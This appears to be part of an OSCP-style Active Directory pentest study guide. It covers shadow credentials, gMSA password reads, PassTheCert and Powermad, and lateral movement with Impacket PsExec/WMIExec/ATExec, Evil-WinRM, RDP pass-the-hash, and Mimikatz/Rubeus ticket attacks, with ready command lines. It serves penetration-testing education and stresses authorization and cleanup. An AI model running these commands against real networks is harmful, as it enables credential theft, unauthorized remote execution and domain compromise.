
title: 9.6.4.10.3 gMSA: inspect the allowed managed-password attribute
text: id="variant-9-6-4-10-3">9.6.4.10.3 gMSA: inspect the allowed managed-password attribute # gMSA: inspect the allowed managed-password attribute bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \ get object 'GMSA$' --attr msDS-ManagedPassword Read: a LAPS value is scoped to the named host's local account. An encrypted Windows-LAPS value still needs the permitted decryption context. A gMSA blob/base64 string is not automatically a directly reusable NT hash: parse/decode it with a compatible gMSA tool before choosing authentication. Missing/denied attributes → distinguish schema, permissions and an empty value. Sources: upstream 1 · upstream 2 . <h2

title: 9.6.4.11 Shadow credentials — object-key write, PKINIT, then cleanup
text: id="shadow-credentials--object-key-write-pkinit-then-cleanup">9.6.4.11 Shadow credentials — object-key write, PKINIT, then cleanup Use only with effective write access to the target's msDS-KeyCredentialLink , a DC supporting the required key-trust/PKINIT behavior, correct time/DNS and compatible certificates. Inspect existing values first. <h3

title: 9.6.4.11.1 python3 pywhisker.py -d DOMAIN -u USER -p 'PASSWORD' --dc-ip DC_IP \
text: id="variant-9-6-4-11-1">9.6.4.11.1 python3 pywhisker.py -d DOMAIN -u USER -p 'PASSWORD' --dc-ip DC_IP \ python3 pywhisker.py -d DOMAIN -u USER -p 'PASSWORD' --dc-ip DC_IP \ --target TARGET_USER --action list <h3

title: 9.6.4.11.2 Adds a new key credential and generates certificate material; record its DeviceID
text: id="variant-9-6-4-11-2">9.6.4.11.2 Adds a new key credential and generates certificate material; record its DeviceID # Adds a new key credential and generates certificate material; record its DeviceID python3 pywhisker.py -d DOMAIN -u USER -p 'PASSWORD' --dc-ip DC_IP \ --target TARGET_USER --action add --filename target-key <h3

title: 9.6.4.11.3 Use the generated PFX password; request the target principal's TGT
text: id="variant-9-6-4-11-3">9.6.4.11.3 Use the generated PFX password; request the target principal's TGT # Use the generated PFX password; request the target principal's TGT python3 gettgtpkinit.py -cert-pfx target-key.pfx -pfx-pass 'PFX_PASSWORD' \ -dc-ip DC_IP DOMAIN/TARGET_USER target.ccache export KRB5CCNAME="$PWD/target.ccache" klist <h3

title: 9.6.4.11.4 Optional NT-hash recovery from this PKINIT TGT; key is the printed AS-REP key
text: id="variant-9-6-4-11-4">9.6.4.11.4 Optional NT-hash recovery from this PKINIT TGT; key is the printed AS-REP key # Optional NT-hash recovery from this PKINIT TGT; key is the printed AS-REP key python3 getnthash.py -key AS_REP_KEY -dc-ip DC_IP DOMAIN/TARGET_USER <h3

title: 9.6.4.11.5 Remove only the key credential you added; never clear unrelated original values
text: id="variant-9-6-4-11-5">9.6.4.11.5 Remove only the key credential you added; never clear unrelated original values # Remove only the key credential you added; never clear unrelated original values python3 pywhisker.py -d DOMAIN -u USER -p 'PASSWORD' --dc-ip DC_IP \ --target TARGET_USER --action remove --device-id DEVICE_ID Read: a successful attribute write does not yet establish a TGT or service authorization. Verify the cached principal and the intended service. PKINIT/certificate failure → inspect KDC support, mapping and trust; do not keep overwriting keys. Preserve the original state and remove only your added DeviceID after the test. Sources: upstream 1 · upstream 2 . <h2

title: 9.6.4.12 PassTheCert — Schannel/LDAP when the certificate is usable there
text: id="passthecert--schannelldap-when-the-certificate-is-usable-there">9.6.4.12 PassTheCert — Schannel/LDAP when the certificate is usable there Use a certificate/private key mapped to an accepted AD identity with the necessary trust/EKU and a working LDAP TLS path. PKINIT and Schannel are different authentication paths: failure of one does not prove the other works or fails. <h3

title: 9.6.4.12.1 Extract PEM material from the relevant PFX; respond to password prompts
text: id="variant-9-6-4-12-1">9.6.4.12.1 Extract PEM material from the relevant PFX; respond to password prompts # Extract PEM material from the relevant PFX; respond to password prompts openssl pkcs12 -in USER.pfx -clcerts -nokeys -out USER.crt openssl pkcs12 -in USER.pfx -nocerts -nodes -out USER.key <h3

title: 9.6.4.12.2 First identify the principal accepted through the certificate
text: id="variant-9-6-4-12-2">9.6.4.12.2 First identify the principal accepted through the certificate # First identify the principal accepted through the certificate python3 passthecert.py -action whoami -crt USER.crt -key USER.key \ -domain DOMAIN -dc-host DC_HOST -dc-ip DC_IP <h3

title: 9.6.4.12.3 Inspect operations in the LDAP shell before choosing an authorized write
text: id="variant-9-6-4-12-3">9.6.4.12.3 Inspect operations in the LDAP shell before choosing an authorized write # Inspect operations in the LDAP shell before choosing an authorized write python3 passthecert.py -action ldap-shell -crt USER.crt -key USER.key \ -domain DOMAIN -dc-host DC_HOST -dc-ip DC_IP Read: successful binding proves that mapped identity's LDAP context, not domain administration. The same object ACL still governs group/password/delegation writes. Certificate trust/mapping, TLS policy or a missing private key can block this route. Do not weaken workstation-wide TLS settings to compensate for an unexplained failure. Sources: upstream 1 . <h2

title: 9.6.4.13 Powermad — create an account only when the chosen AD path needs it
text: id="powermad--create-an-account-only-when-the-chosen-ad-path-needs-it">9.6.4.13 Powermad — create an account only when the chosen AD path needs it Use from a suitable authenticated PowerShell context when the actual quota/delegation permits computer creation and the planned path needs an account/SPN you control. Account creation alone does not grant RBCD rights on another host. Import-Module .\Powermad.ps1 $machinePassword = ConvertTo-SecureString 'MACHINE_PASSWORD' -AsPlainText -Force New-MachineAccount -MachineAccount NEWPC -Password $machinePassword ` -Domain DOMAIN -DomainController DC_HOST Read: verify the created account, its SPNs and the chosen target-object permission separately. Quota, OU ACLs and existing names can stop the operation. Standard create rights do not necessarily permit deleting the created account later; establish the cleanup route and avoid repeated throwaway account creation. Sources: upstream 1 . <h2

title: 9.6.4.14 gMSA — obtain a decoded hash only with managed-password read rights
text: id="gmsa--obtain-a-decoded-hash-only-with-managed-password-read-rights">9.6.4.14 gMSA — obtain a decoded hash only with managed-password read rights Use when the accepted directory identity has the managed-password read permission for the gMSA. NetExec selects LDAPS for this operation, so the DC's LDAP TLS path must work. <h3

title: 9.6.4.14.1 nxc ldap DC_IP -d DOMAIN -u USER -p 'PASSWORD' --gmsa
text: id="variant-9-6-4-14-1">9.6.4.14.1 nxc ldap DC_IP -d DOMAIN -u USER -p 'PASSWORD' --gmsa nxc ldap DC_IP -d DOMAIN -u USER -p 'PASSWORD' --gmsa <h3

title: 9.6.4.14.2 After identifying the returned service account and hash, test one relevant service
text: id="variant-9-6-4-14-2">9.6.4.14.2 After identifying the returned service account and hash, test one relevant service # After identifying the returned service account and hash, test one relevant service nxc smb TARGET -d DOMAIN -u 'GMSA$' -H HASH --shares Read: keep the exact service-account name and decoded NT hash together; an encoded msDS-ManagedPassword blob is a different representation. Authentication acceptance still does not prove administrative/remote-execution rights. Empty output → inspect object permissions, LDAPS, account type and collection errors before concluding that no gMSA path exists. Sources: upstream 1 . <h2

title: 9.6.4.15 Sources
text: id="sources">9.6.4.15 Sources Supplied PEN-200, Chapter 23, especially the targeted Kerberoast, silver-ticket and DCSync sections. OffSec OSCP+ Body of Knowledge PowerSploit PowerView (archived) getSH Active Directory: Object Permissions, AD CS, GPO Abuse and Domain Compromise , source snapshot e1f62dd Certipy Impacket secretsdump SpecterOps AD CS research Hexdump Active Directory modules

title: 9.6.5 Lateral Movement
text: id="lateral-movement">9.6.5 Lateral Movement ← Stage index | Identity transitions | Pivoting | AD cheatsheet | Strategy map | Study methods: Move to another host Selection rule: credential type → accepted authentication protocol → reachable service → service-specific authorization → execution/session effect. Exit: verify the destination hostname, represented identity, token /rights and network state; then re-enumerate credentials, domain relationships, sessions and routes. <h2

title: 9.6.5.1 Choose by credential and service
text: id="1-choose-by-credential-and-service">9.6.5.1 Choose by credential and service Material Compatible starting paths Important boundary Password SMB/SCM, WMI/DCOM, WinRM/WinRS, RDP Correct password does not grant the required logon or execution right NT hash NTLM-capable SMB/WMI/WinRM; RDP only through Restricted Admin where supported Net-NTLM and DCC2 are not reusable NT hashes TGT /ccache Kerberos-capable tool using target FQDN/ SPN Ticket identity, realm, lifetime, DNS and KDC route must match TGS Only the named SERVICE/HOST and compatible client A CIFS ticket does not authorize WinRM, WMI or RDP AES/NT long-term key Request a TGT, then use Kerberos RC4/NT-key requests can fail where RC4 is disabled Local-account password/hash NTLM or RDP in the target's local account context Remote UAC/account restrictions commonly filter non-RID-500 local administrators Reachable service Common execution/access mechanisms Usual authorization SMB 445 + SCM/RPC PsExec, SMBExec, service creation Administrative share plus SCM/service rights RPC endpoint mapper 135 + dynamic RPC; often SMB for output WMIExec, native CIM/WMI, DCOM Remote WMI/DCOM rights, commonly an effective administrator token Task Scheduler RPC plus SMB output ATExec Remote task creation and administrative output access WinRM 5985/5986 WinRS, PowerShell remoting, Evil-WinRM Enabled endpoint and endpoint/session authorization RDP 3389 FreeRDP, MSTSC Remote-interactive logon right; Restricted Admin requires administrator access <h2

title: 9.6.5.2 Preflight from the actual source
text: id="2-preflight-from-the-actual-source">9.6.5.2 Preflight from the actual source Directly routed source: nmap -Pn -sT -sV -p 135,139,445,3389,5985,5986 TARGET -oN movement-preflight.txt getent hosts TARGET_HOST date -u Windows source: Resolve-DnsName TARGET_HOST Test-NetConnection TARGET_HOST -Port 445 Test-NetConnection TARGET_HOST -Port 5985 Test-NetConnection TARGET_HOST -Port 3389 w32tm /query /status Port 135 alone does not prove WMI/DCOM viability because RPC commonly negotiates a dynamic high port. When the destination is reachable only through a pivot, perform these checks through the established Block 13 route and respect the client/proxy's transport limits. Record: SOURCE POSITION -> TARGET FQDN/IP -> ROUTE -> SERVICE/PORT -> CREDENTIAL TYPE -> LOCAL/DOMAIN IDENTITY -> EXPECTED RIGHT -> CHOSEN METHOD -> EXPECTED EFFECT <h2

title: 9.6.5.3 Validate authentication separately from execution
text: id="3-validate-authentication-separately-from-execution">9.6.5.3 Validate authentication separately from execution NetExec can classify a selected SMB credential: <h3

title: 9.6.5.3.1 Domain password
text: id="variant-9-6-5-3-1">9.6.5.3.1 Domain password # Domain password nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' <h3

title: 9.6.5.3.2 Domain NT hash
text: id="variant-9-6-5-3-2">9.6.5.3.2 Domain NT hash # Domain NT hash nxc smb TARGET -d DOMAIN -u USER -H NT_HASH <h3

title: 9.6.5.3.3 Target-local account
text: id="variant-9-6-5-3-3">9.6.5.3.3 Target-local account # Target-local account nxc smb TARGET -u Administrator -H NT_HASH --local-auth <h3

title: 9.6.5.3.4 Prove only share access
text: id="variant-9-6-5-3-4">9.6.5.3.4 Prove only share access # Prove only share access nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares A successful login proves SMB authentication. (Pwn3d!) is NetExec's SMB administrative-context indicator, not proof that WinRM, RDP, WMI or every SMB execution method will succeed. For one justified execution proof: nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' -x "hostname & whoami" --exec-method wmiexec Current NetExec can select wmiexec , atexec or smbexec ; without an explicit method it may fail over between them. Use a forced method when diagnosing prerequisites so the result remains attributable. <h2

title: 9.6.5.4 SMB and service-control execution
text: id="4-smb-and-service-control-execution">9.6.5.4 SMB and service-control execution <h3

title: 9.6.5.4.1 Impacket PsExec
text: id="impacket-psexec">9.6.5.4.1 Impacket PsExec <h4

title: 9.6.5.4.1.1 Password
text: id="variant-9-6-5-4-1-1">9.6.5.4.1.1 Password # Password impacket-psexec 'DOMAIN/USER:PASSWORD@TARGET' <h4

title: 9.6.5.4.1.2 NT hash / Pass-the-Hash
text: id="variant-9-6-5-4-1-2">9.6.5.4.1.2 NT hash / Pass-the-Hash # NT hash / Pass-the-Hash impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' Need: SMB 445/139, writable administrative share and Service Control Manager rights. Impacket uploads a RemCom service binary, creates/starts a service and communicates over named pipes. Verify the returned identity; the service context is commonly SYSTEM. Kerberos cache: export KRB5CCNAME="$PWD/USER.ccache" impacket-psexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST' The target parameter uses the hostname matching the CIFS/HOST SPN; -target-ip separates connection routing from Kerberos naming. <h3

title: 9.6.5.4.2 Sysinternals PsExec from Windows
text: id="sysinternals-psexec-from-windows">9.6.5.4.2 Sysinternals PsExec from Windows PsExec64.exe -accepteula \\TARGET_HOST -u DOMAIN\USER -p PASSWORD cmd.exe The official PsExec binary is not built into Windows. It requires remote administrative access and creates the PSEXESVC service/artifacts. Avoid putting real passwords in retained shell history; an existing authorized network credential context is preferable. <h3

title: 9.6.5.4.3 SMBExec
text: id="smbexec">9.6.5.4.3 SMBExec impacket-smbexec 'DOMAIN/USER:PASSWORD@TARGET' impacket-smbexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' SMBExec creates temporary services whose command lines redirect output through a share. It does not use the same uploaded RemCom binary as PsExec, but it still requires SCM/service rights and produces substantial service/event artifacts. <summary

title: 9.6.5.4.3.1 Kerberos and alternate output modes
text: id="variant-9-6-5-4-3-1">9.6.5.4.3.1 Kerberos and alternate output modes <h4

title: 9.6.5.4.3.2 export KRB5CCNAME="$PWD/USER.ccache"
text: id="variant-9-6-5-4-3-2">9.6.5.4.3.2 export KRB5CCNAME="$PWD/USER.ccache" export KRB5CCNAME="$PWD/USER.ccache" impacket-smbexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST' <h4

title: 9.6.5.4.3.3 SHARE is default; SERVER starts a local SMB server and needs permission to bind locally.
text: id="variant-9-6-5-4-3-3">9.6.5.4.3.3 SHARE is default; SERVER starts a local SMB server and needs permission to bind locally. # SHARE is default; SERVER starts a local SMB server and needs permission to bind locally. impacket-smbexec -mode SHARE -share C$ 'DOMAIN/USER:PASSWORD@TARGET' <h3

title: 9.6.5.4.4 ATExec
text: id="atexec">9.6.5.4.4 ATExec impacket-atexec 'DOMAIN/USER:PASSWORD@TARGET_HOST' "cmd.exe /c hostname & whoami" impacket-atexec -hashes :NT_HASH 'DOMAIN/USER@TARGET_HOST' "cmd.exe /c hostname & whoami" ATExec creates and deletes a scheduled task and normally retrieves output from ADMIN$\Temp . It is a one-shot command mechanism, not an interactive shell; task-scheduler RPC and administrative share access must both work. Kerberos: export KRB5CCNAME="$PWD/USER.ccache" impacket-atexec -k -no-pass -dc-ip DC_IP 'DOMAIN/USER@TARGET_HOST' "cmd.exe /c hostname & whoami" <h2

title: 9.6.5.5 WMI and DCOM execution
text: id="5-wmi-and-dcom-execution">9.6.5.5 WMI and DCOM execution <h3

title: 9.6.5.5.1 Impacket WMIExec
text: id="impacket-wmiexec">9.6.5.5.1 Impacket WMIExec impacket-wmiexec 'DOMAIN/USER:PASSWORD@TARGET' impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' WMIExec creates processes through WMI/DCOM. Its normal output channel uses SMB and defaults to ADMIN$ ; therefore a WMI process may run even when output retrieval fails. -nooutput or -silentcommand changes that evidence channel. Kerberos with separate name and route: export KRB5CCNAME="$PWD/USER.ccache" impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST' <summary

title: 9.6.5.5.1.1 One command, no SMB output
text: id="variant-9-6-5-5-1-1">9.6.5.5.1.1 One command, no SMB output impacket-wmiexec -nooutput 'DOMAIN/USER:PASSWORD@TARGET' "cmd.exe /c echo MOVEMENT_OK > C:\Windows\Temp\movement-proof.txt" Verify the harmless artifact through an independently authorized channel. No returned stdout is expected. <h3

title: 9.6.5.5.2 Native PowerShell CIM over DCOM
text: id="native-powershell-cim-over-dcom">9.6.5.5.2 Native PowerShell CIM over DCOM $Credential = Get-Credential 'DOMAIN\USER' $Options = New-CimSessionOption -Protocol Dcom $Session = New-CimSession -ComputerName TARGET_HOST -Credential $Credential -SessionOption $Options Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = 'cmd.exe /c hostname > C:\Windows\Temp\movement-proof.txt' } Remove-CimSession $Session ReturnValue = 0 and a process ID confirm process creation, not its final effect. WMI-created processes run in session 0; GUI programs will not appear on an interactive desktop. <h3

title: 9.6.5.5.3 DCOM MMC method
text: id="dcom-mmc-method">9.6.5.5.3 DCOM MMC method Current Windows token: $Type = [type]::GetTypeFromProgID('MMC20.Application.1','TARGET_HOST') $Object = [Activator]::CreateInstance($Type) $Object.Document.ActiveView.ExecuteShellCommand( 'cmd.exe', $null, '/c hostname > C:\Windows\Temp\movement-proof.txt', '7' ) Impacket with password or NT hash: impacket-dcomexec 'DOMAIN/USER:PASSWORD@TARGET' impacket-dcomexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' Current Impacket dcomexec explicitly rejects Kerberos for its supported MMC/Shell DCOM objects because they do not accept the required HOST ticket. Use wmiexec -k when Kerberos command execution is required. DCOM class availability, RPC reachability and launch/access permissions vary. <h2

title: 9.6.5.6 WinRM, WinRS and PowerShell remoting
text: id="6-winrm-winrs-and-powershell-remoting">9.6.5.6 WinRM, WinRS and PowerShell remoting <h3

title: 9.6.5.6.1 Evil-WinRM
text: id="evil-winrm">9.6.5.6.1 Evil-WinRM <h4

title: 9.6.5.6.1.1 Password; omit -p to prompt where supported
text: id="variant-9-6-5-6-1-1">9.6.5.6.1.1 Password; omit -p to prompt where supported # Password; omit -p to prompt where supported evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD' <h4

title: 9.6.5.6.1.2 NT hash
text: id="variant-9-6-5-6-1-2">9.6.5.6.1.2 NT hash # NT hash evil-winrm -i TARGET_HOST -u USER -H NT_HASH <h4

title: 9.6.5.6.1.3 HTTPS listener
text: id="variant-9-6-5-6-1-3">9.6.5.6.1.3 HTTPS listener # HTTPS listener evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD' -S -P 5986 Current Evil-WinRM ticket-file support: evil-winrm -i TARGET_FQDN -r DOMAIN -K USER.ccache --spn HTTP Need: reachable 5985/5986, an enabled WinRM/PowerShell endpoint and endpoint authorization. The identity is commonly an administrator or a member of the applicable remote-management group, but endpoint SDDL/policy is decisive. Kerberos requires the FQDN/SPN, realm/KDC configuration and a compatible ticket. <h3

title: 9.6.5.6.2 Native WinRS
text: id="native-winrs">9.6.5.6.2 Native WinRS winrs /r:TARGET_HOST /u:DOMAIN\USER /p:PASSWORD "cmd /c hostname & whoami" To avoid retaining a password on the command line, use the current authorized Windows credential context where possible: winrs /r:TARGET_HOST "cmd /c hostname & whoami" WinRS uses WinRM. A non-administrator can require /noprofile depending on endpoint configuration. /allowdelegate affects onward credential use and is not a default fix for the double-hop problem. <h3

title: 9.6.5.6.3 PowerShell remoting
text: id="powershell-remoting">9.6.5.6.3 PowerShell remoting Test-WSMan TARGET_HOST $Credential = Get-Credential 'DOMAIN\USER' Invoke-Command -ComputerName TARGET_HOST -Credential $Credential -ScriptBlock { hostname whoami /all } $Session = New-PSSession -ComputerName TARGET_HOST -Credential $Credential Enter-PSSession -Session $Session A hostname normally supports Negotiate/Kerberos in a domain. An IP address requires explicit credentials and generally HTTPS or a tightly scoped TrustedHosts configuration. Do not weaken global TrustedHosts merely to hide DNS/SPN mistakes. <h2

title: 9.6.5.7 RDP
text: id="7-rdp">9.6.5.7 RDP Check the installed binary name: command -v xfreerdp3 || command -v xfreerdp Password: xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /p:'PASSWORD' /cert:ignore /dynamic-resolution +clipboard Older packages may expose the same syntax through xfreerdp . NT hash: xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /pth:NT_HASH /cert:ignore /dynamic-resolution FreeRDP's /pth uses Restricted Admin mode. The target must support/permit that mode and the identity must be an administrator; ordinary Remote Desktop Users membership is not sufficient for Restricted Admin. Password-based RDP instead needs the Remote Desktop service, NLA compatibility and the effective “Allow log on through Remote Desktop Services” right without a deny override. Native client: mstsc.exe /v:TARGET_HOST mstsc.exe /restrictedAdmin /v:TARGET_HOST Ordinary RDP can place reusable user credentials in the destination's LSASS. Restricted Admin avoids sending those reusable credentials but prevents ordinary onward access as that user; treat the resulting session's network identity separately. <h2

title: 9.6.5.8 Pass-the-Hash, Overpass-the-Hash and Pass-the-Ticket
text: id="8-pass-the-hash-overpass-the-hash-and-pass-the-ticket">9.6.5.8 Pass-the-Hash, Overpass-the-Hash and Pass-the-Ticket <h3

title: 9.6.5.8.1 Pass-the-Hash
text: id="pass-the-hash">9.6.5.8.1 Pass-the-Hash NT HASH -> NTLM CHALLENGE/RESPONSE -> TARGET SERVICE PtH requires an NTLM-capable service, a valid account context and the service-specific right. SMB share access may work without administrative execution; PsExec/WMIExec/SMBExec usually need administrative rights. Remote UAC commonly filters non-built-in local administrators. Domain accounts in the target Administrators group traditionally receive a full remote token, but newer Administrator Protection policy can change that result—trust the observed target token and method-specific authorization. <h3

title: 9.6.5.8.2 Overpass-the-Hash / key-to-ticket
text: id="overpass-the-hash--key-to-ticket">9.6.5.8.2 Overpass-the-Hash / key-to-ticket Mimikatz network-credential context: sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NT_HASH /run:powershell.exe Rubeus TGT request: Rubeus.exe asktgt /user:USER /domain:DOMAIN /rc4:NT_HASH /dc:DC_HOST /ptt klist AES alternative: Rubeus.exe asktgt /user:USER /domain:DOMAIN /aes256:AES256_KEY /dc:DC_HOST /ptt Trigger a Kerberos service request with the hostname, then inspect: dir \\TARGET_HOST\C$ klist In a Mimikatz sekurlsa::pth process, whoami can still show the original local process token while network authentication uses the supplied identity. Validate the ticket's client and the remote result rather than treating local whoami as the network identity. <h3

title: 9.6.5.8.3 Pass-the-Ticket
text: id="pass-the-ticket">9.6.5.8.3 Pass-the-Ticket Windows: Rubeus.exe ptt /ticket:ticket.kirbi klist kerberos::ptt ticket.kirbi Linux: export KRB5CCNAME="$PWD/ticket.ccache" klist impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST' A TGS must name the selected service/hostname. A TGT can request a suitable TGS only while valid and when the KDC is reachable. Ticket import is not lateral movement until the destination accepts it and produces the intended authorized effect. <h2

title: 9.6.5.9 Local versus domain identity and remote UAC
text: id="9-local-versus-domain-identity-and-remote-uac">9.6.5.9 Local versus domain identity and remote UAC DOMAIN\USER -> domain identity; evaluate target-local group/right TARGET\USER -> SAM identity on that target ./USER -> tool-specific local-account selection Common failure pattern: a local account authenticates over SMB; Windows issues a filtered remote token; ADMIN$ , SCM or WMI administrative operations fail. Do not “fix” this by changing LocalAccountTokenFilterPolicy during an attack workflow. Use a method already permitted by the target's configuration, the built-in Administrator where legitimately obtained and applicable, RDP if authorized, or another mapped identity. <h2

title: 9.6.5.10 Output channels, session 0 and double hop
text: id="10-output-channels-session-0-and-double-hop">9.6.5.10 Output channels, session 0 and double hop Remote process creation, stdout retrieval and an interactive shell are separate states: AUTHENTICATED -> REMOTE OPERATION AUTHORIZED -> PROCESS/TASK/SERVICE CREATED -> COMMAND EFFECT OCCURRED -> OUTPUT RETURNED OR CALLBACK CONNECTED -> USABLE SESSION PsExec returns named-pipe I/O through its service. WMIExec normally redirects output to an SMB share. SMBExec redirects command output while repeatedly creating services. ATExec writes output under ADMIN$\Temp . Native WMI/DCOM may return only a PID/return value; verify a harmless file or another bounded effect. WMI/DCOM/service processes commonly run in session 0, so a GUI is not visible to the logged-on user. WinRM creates a remote shell/runspace and returns structured or text output. A WinRM/PowerShell session on HOST_A may not possess delegable credentials for HOST_B. That “double hop” is a credential-context problem, not proof that HOST_B or the password is wrong. Prefer executing from the source that actually holds the credential/ticket rather than enabling broad delegation. <h2

title: 9.6.5.11 Failure router
text: id="11-failure-router">9.6.5.11 Failure router Evidence Layer Next decision Timeout/refused Route, firewall or listener Verify from the actual source and account for RPC dynamic ports SMB login succeeds; ADMIN$ denied Share/admin token/UAC Distinguish share authentication from effective administrator context (Pwn3d!) but forced method fails Method-specific SCM/WMI/task prerequisite Test only that method's RPC/service right and side effects STATUS_LOGON_FAILURE Credential/domain/authentication Correct local/domain context, artifact type and protocol STATUS_ACCOUNT_RESTRICTION or logon-type denial Account policy/right Check permitted logon type and deny overrides RPC server unavailable 135/dynamic RPC/firewall/service Validate endpoint mapper and negotiated port from source WMI return value nonzero Process creation request failed Decode return value; command effect is unconfirmed Process succeeds; output missing Output channel, share or session-0 behavior Use a bounded file/side-effect proof or compatible output option WinRM listener responds; shell denied Endpoint SDDL/group/logon/UAC policy Validate endpoint authorization, not merely credentials RDP NLA succeeds; logon denied Remote-interactive right or deny policy Verify Remote Desktop Users/Administrators and user-right assignment RDP /pth denied Restricted Admin disabled/unsupported or user not admin Do not equate ordinary RDP authorization with Restricted Admin KDC_ERR_S_PRINCIPAL_UNKNOWN Hostname/SPN/realm Use FQDN matching the ticket and correct realm KRB_AP_ERR_MODIFIED SPN account/key mismatch Confirm SPN owner, target alias and ticket key Clock-skew error Time Repair time before credential changes Kerberos tool uses IP and falls back/fails Name/SPN selection Separate TARGET_HOST from TARGET_IP First hop works; second hop denied Credential delegation/double hop Move execution to credential-holding source or use an explicit ticket <h2

title: 9.6.5.12 After movement
text: id="12-after-movement">9.6.5.12 After movement hostname whoami /all ipconfig /all route print netstat -ano klist Re-enumerate: local privilege and accessible credential sources; domain groups, ACLs, shares and host rights under the new identity; logged-on sessions and service accounts; interfaces, routes, DNS, listeners and internal reachability; the next evidence-backed host/identity transition. Do not overwrite the earlier state. Record the source host, credential form, authentication protocol, execution method, returned identity and side effects. <h2

title: 9.6.5.13 Tooling for this section
text: id="tooling-for-this-section">9.6.5.13 Tooling for this section Tool Choose it for Needs Baseline Decisive output Failure cue Nmap/Test-NetConnection Service reachability Actual source route Section 2 Reachable named service Direct test bypasses/ignores the pivot NetExec Selected credential/admin-context validation Supported protocol and credential Section 3 Exact identity plus method-specific admin cue Auth success without execution right Impacket PsExec Interactive SMB/SCM execution Admin share + SCM Section 4 Remote shell/verified identity Share/service creation denied Impacket SMBExec Command shell without RemCom upload SCM + output route Section 4 Command output Service/output share failure Impacket ATExec One-shot scheduled task Task RPC + ADMIN$ output Section 4 Retrieved command output Task created but output unavailable Impacket WMIExec WMI process creation with password/hash/ticket RPC/DCOM; SMB unless no-output Section 5 Shell/output or verified effect RPC works but share/output fails Impacket DCOMExec NTLM password/hash DCOM objects RPC/DCOM and supported object Section 5 Verified command effect Kerberos deliberately unsupported Evil-WinRM Interactive WinRM/PSRP Endpoint authorization Section 6 Remote PowerShell prompt Listener present but endpoint rejects WinRS/PowerShell remoting Built-in Windows management WinRM and token/credential Section 6 Remote hostname/identity IP trust or double-hop issue FreeRDP/MSTSC GUI/remote-interactive session RDP right/NLA; admin for Restricted Admin Section 7 Usable desktop with verified identity Auth accepted but logon type denied Rubeus/Mimikatz/klist Key/ticket context Correct key/ticket/logon session Section 8 Expected TGT/TGS client and service Local token confused with network identity Package names vary: current Kali-style Impacket commands commonly use the impacket- prefix, and FreeRDP 3 packages may expose xfreerdp3 while older packages use xfreerdp . Inspect local -h output before use. <h2

title: 9.6.5.14 winexe — Samba-side service execution alternative
text: id="winexe--samba-side-service-execution-alternative">9.6.5.14 winexe — Samba-side service execution alternative Use when the chosen account has working SMB authentication and effective remote service-control/administrative rights. This is a service-execution transport, not a credential bypass. # Prompts for the accepted identity's password winexe -U 'DOMAIN/USER' //TARGET 'cmd.exe /c whoami' Read: verify the returned identity and destination. Access denied after a successful login points to authorization/UAC/service-control conditions; it does not justify guessing more passwords. Service creation and resulting artifacts require the same cleanup discipline as the other SMB execution methods. Prefer the existing supported Impacket/NetExec method when this legacy client is unavailable or incompatible. Sources: upstream 1 . <h2
